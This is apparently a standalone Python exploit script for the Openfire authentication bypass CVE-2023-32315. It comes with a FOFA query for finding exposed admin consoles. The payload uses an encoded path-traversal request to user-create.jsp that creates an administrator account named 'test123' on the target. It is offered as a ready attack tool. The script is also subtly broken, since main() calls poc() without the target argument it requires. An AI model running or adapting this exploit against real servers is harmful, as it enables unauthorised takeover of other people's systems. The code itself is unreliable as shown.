#fofa:title=="Openfire Admin Console"
#导包
import requests,sys,argparse,json
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test="""
 _  ____  _____ _      _____  _  _____ ___  _   ____  _____ ____  _      _  ____  ____  _  ____  _        ____ ___  _ ____  ____  ____  ____ 
/ \/  _ \/  __// \  /|/__ __\/ \/__ __\\  \//  /  __\/  __//  __\/ \__/|/ \/ ___\/ ___\/ \/  _ \/ \  /|  /  _ \\  \///  __\/  _ \/ ___\/ ___\
| || | \||  \  | |\ ||  / \  | |  / \   \  /   |  \/||  \  |  \/|| |\/||| ||    \|    \| || / \|| |\ ||  | | // \  / |  \/|| / \||    \|    \
| || |_/||  /_ | | \||  | |  | |  | |   / /    |  __/|  /_ |    /| |  ||| |\___ |\___ || || \_/|| | \||  | |_\\ / /  |  __/| |-||\___ |\___ |
\_/\____/\____\\_/  \|  \_/  \_/  \_/  /_/     \_/   \____\\_/\_\\_/  \|\_/\____/\____/\_/\____/\_/  \|  \____//_/   \_/   \_/ \|\____/\____/
                                                                                                                                             


"""
    print(test)
#主函数
def main():
    banner()
    parse = argparse.ArgumentParser(description="Openfire身份认证绕过漏洞(CVE-2023-32315)")
    parse.add_argument('-url','--url',dest='url',help='input url')
    args = parse.parse_args()
    if args.url:
        poc()
#poc函数
def poc(target):
    payload ='/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=test123&name=&email=&password=test123&passwordConfirm=test123&isadmin=on&create=Create+User' 
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '0',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Cookie': 'csrf=csrftoken',
    }
    try:
        res = requests.get(url=target + payload,headers=headers,verify=False)
        if res.status_code == 200 and "Exception" in res.text:
            print(f'[+]{target}存在漏洞')
        else:
            print(f'[-]{target}不存在漏洞')
    except:
        pass
        
    
#函数入口
if __name__ == "__main__":
    main()